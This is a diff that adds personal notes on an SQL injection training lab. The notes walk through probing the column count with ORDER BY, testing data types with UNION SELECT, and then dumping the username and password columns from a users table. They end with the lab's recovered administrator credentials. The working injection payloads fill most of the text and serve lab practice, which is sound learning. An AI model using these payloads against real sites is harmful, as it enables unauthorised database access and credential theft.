@@ -1,0 +1,18 @@
+==> SQLi lab 9
+==> Goal: get the admins username and password from the table users which has a columns named username, password
+after getting the admin's credencials log in to solve the lab
+
+> total number of columns used by the query
+payload: ' order by 3-- (query using 2 columns)
+
+> datatype of columns?
+payload: ' UNION SELECT 'a','a'--
+(if 200 OK then both columns has string datatypes)
+
+> getting the username and password retrieved
+payload: ' UNION SELECT username, password FROM users--
+(200 OK-> means lab is solved successfully you will see the list of users and passwords)
+
+> find the administrator's password and log in and the lab is solved....
+username: administrator
+password: 5iy5v6llcudsnhipue9w
